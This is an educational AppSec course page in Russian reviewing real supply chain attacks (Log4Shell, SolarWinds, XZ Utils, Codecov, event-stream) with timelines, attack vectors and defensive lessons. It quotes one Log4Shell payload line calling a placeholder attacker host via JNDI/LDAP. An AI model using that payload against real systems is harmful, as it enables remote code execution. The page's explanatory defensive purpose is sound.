---
title: "Supply Chain Attacks — атаки на цепочку поставок | Курс AppSec"
description: "Supply chain атаки: SolarWinds, Log4Shell, XZ Utils, Codecov, event-stream — разбор реальных инцидентов с timeline и уроками."
keywords: "supply chain, атаки, SolarWinds, Log4Shell, XZ Utils, Codecov, event-stream, AppSec, DevSecOps, кейсы ИБ"
---

<div class="hero-section hero-section--compact">
  <div class="hero-content">
    <h1 class="hero-title">Supply Chain Attacks</h1>
    <p class="hero-sub">Реальные кейсы атак на цепочку поставки ПО</p>
  </div>
</div>

Атаки на цепочку поставки (Supply Chain Attacks) — компрометация не самого приложения, а его зависимостей, инструментов сборки или инфраструктуры доставки. Одна скомпрометированная библиотека может затронуть тысячи downstream-проектов.

---

## Log4Shell (CVE-2021-44228)

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <span class="lab-tag" style="background:rgba(213,26,26,0.12); color:var(--brand-red); border-color:rgba(213,26,26,0.25);">CVSS 10.0</span>
    <span class="lab-card-title" style="font-weight:700;">Декабрь 2021</span>
    <p style="font-size:0.75rem; margin:0; color:#555;">Компонент: Apache Log4j 2.x (Java)</p>
  </div>
</div>

**Что произошло:** Уязвимость в библиотеке логирования Log4j позволяла выполнить произвольный код через JNDI lookup в строке лога. Payload: `${jndi:ldap://attacker.com/exploit}`.

**Масштаб:** ~35 000 Java-пакетов затронуто. Minecraft, Apple iCloud, VMware, AWS, Cloudflare — все использовали Log4j. Эксплуатация началась через часы после публикации.

**Timeline:**

- 24 ноября 2021 — Alibaba Cloud Security Team сообщает Apache
- 9 декабря — публичный disclosure, PoC exploit
- 10 декабря — массовая эксплуатация в дикой природе
- 13 декабря — патч Log4j 2.16.0 (2.15.0 был неполным)
- Январь 2022 — ещё 2 CVE в том же компоненте

**Уроки:**

!!! warning "Takeaway"

    - Транзитивные зависимости убивают: проект не использовал Log4j напрямую, но Spring Boot тянул её
    - SBOM (Software Bill of Materials) — единственный способ узнать что внутри
    - SCA-сканеры (OWASP DC, Trivy) должны работать в CI постоянно, не разово

---

## SolarWinds Orion (SUNBURST)

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <span class="lab-tag" style="background:rgba(213,26,26,0.12); color:var(--brand-red); border-color:rgba(213,26,26,0.25);">APT / Nation-state</span>
    <span class="lab-card-title" style="font-weight:700;">Декабрь 2020</span>
    <p style="font-size:0.75rem; margin:0; color:#555;">Компонент: SolarWinds Orion (мониторинг IT)</p>
  </div>
</div>

**Что произошло:** Группировка (предположительно SVR) скомпрометировала build-систему SolarWinds и внедрила backdoor в обновление Orion. Подписанный легитимным сертификатом update распространился на 18 000 организаций.

**Масштаб:** Минфин США, Минюст, Microsoft, FireEye, Intel, Cisco, Deloitte. Бэкдор работал ~9 месяцев незамеченным.

**Вектор атаки:**

1. Компрометация CI/CD сервера SolarWinds
2. Внедрение кода в `SolarWinds.Orion.Core.BusinessLayer.dll`
3. Код ждал 2 недели перед активацией (anti-sandbox)
4. DNS-based C2 через поддомены `avsvmcloud.com`
5. Загрузка второй стадии через HTTP

**Уроки:**

!!! warning "Takeaway"

    - Build-система — критический актив, требует защиты как production
    - Подписанный код ≠ безопасный код
    - Reproducible builds — возможность верифицировать что бинарь собран из конкретного source
    - Мониторинг аномального DNS-трафика

---

## XZ Utils Backdoor (CVE-2024-3094)

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <span class="lab-tag" style="background:rgba(213,26,26,0.12); color:var(--brand-red); border-color:rgba(213,26,26,0.25);">CVSS 10.0</span>
    <span class="lab-card-title" style="font-weight:700;">Март 2024</span>
    <p style="font-size:0.75rem; margin:0; color:#555;">Компонент: xz/liblzma (Linux compression)</p>
  </div>
</div>

**Что произошло:** Злоумышленник «Jia Tan» за 2 года заработал доверие maintainer-а XZ Utils, получил commit access и внедрил backdoor в liblzma. Backdoor перехватывал SSH-аутентификацию через systemd → sshd → liblzma dependency chain.

**Обнаружение:** Андрес Фройнд (Microsoft) заметил аномальное замедление SSH на 500ms и провёл расследование.

**Timeline:**

- 2021 — «Jia Tan» начинает контрибутить в xz-utils
- 2022 — получает commit access после давления на maintainer-а
- Февраль 2024 — внедряет backdoor в v5.6.0 и 5.6.1
- 29 марта 2024 — Андрес Фройнд публикует findings
- 30 марта — CVE-2024-3094, откат дистрибутивов

**Уроки:**

!!! warning "Takeaway"

    - Social engineering на maintainers — реальный вектор
    - Один maintainer на критический проект — single point of failure
    - Аномалии производительности могут указывать на backdoor
    - Release tarball отличался от git source — reproducible builds поймали бы

---

## Codecov Bash Uploader

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <span class="lab-tag">CI/CD Attack</span>
    <span class="lab-card-title" style="font-weight:700;">Январь — Апрель 2021</span>
    <p style="font-size:0.75rem; margin:0; color:#555;">Компонент: Codecov Bash Uploader script</p>
  </div>
</div>

**Что произошло:** Атакующие модифицировали bash-скрипт `codecov-bash` (coverage uploader). Скрипт извлекал environment variables CI (включая secrets, tokens, keys) и отправлял на сервер атакующих.

**Масштаб:** Twitch, HashiCorp, Confluent, Monday.com. HashiCorp ротировал GPG signing key.

**Вектор:** Скрипт загружался через `curl | bash` — классический anti-pattern. Модификация произошла через Docker image build process Codecov.

**Уроки:**

!!! warning "Takeaway"

    - `curl | bash` — никогда в CI для критических скриптов
    - Pinning по SHA / checksum для внешних скриптов
    - CI secrets доступны всем steps — минимизируйте scope
    - Аудит переменных окружения CI: что доступно каждому step

---

## event-stream (npm)

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));">
  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <span class="lab-tag">Dependency Hijack</span>
    <span class="lab-card-title" style="font-weight:700;">Ноябрь 2018</span>
    <p style="font-size:0.75rem; margin:0; color:#555;">Компонент: event-stream npm package (2M+ weekly downloads)</p>
  </div>
</div>

**Что произошло:** Новый maintainer добавил зависимость `flatmap-stream`, которая содержала зашифрованный код для кражи Bitcoin из Copay wallet. Целевая атака через npm supply chain.

**Вектор:**

1. Оригинальный автор устал от поддержки
2. Передал ownership новому контрибутору
3. Новый maintainer добавил `flatmap-stream` → содержал AES-зашифрованный payload
4. Payload расшифровывался только в контексте Copay wallet app

**Уроки:**

!!! warning "Takeaway"

    - Transfer of ownership — критический момент для аудита
    - Зашифрованный код в зависимостях — red flag
    - `npm audit` и `yarn audit` не ловят такие атаки — нужен manual review
    - Lockfile integrity (`npm ci` вместо `npm install`)

---

## Защитные меры

<div class="lab-grid" style="grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));">

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="font-size:0.82rem; font-weight:700; color:var(--brand-red);">SCA в CI</div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">OWASP Dependency-Check, Trivy, npm audit, pip-audit — на каждый PR.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="font-size:0.82rem; font-weight:700; color:var(--brand-red);">SBOM</div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Генерировать CycloneDX/SPDX при каждом релизе. Знать что внутри.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="font-size:0.82rem; font-weight:700; color:var(--brand-red);">Pinning</div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Lockfiles, SHA pinning для Actions, digest для Docker images.</p>
  </div>

  <div class="lab-card" style="flex-direction: column; align-items: flex-start; gap: 0.4rem;">
    <div style="font-size:0.82rem; font-weight:700; color:var(--brand-red);">Least Privilege</div>
    <p style="font-size:0.75rem; margin:0.2rem 0 0; color:#555; line-height:1.5;">Минимальные permissions в CI, OIDC вместо secrets, scope-limited tokens.</p>
  </div>

</div>
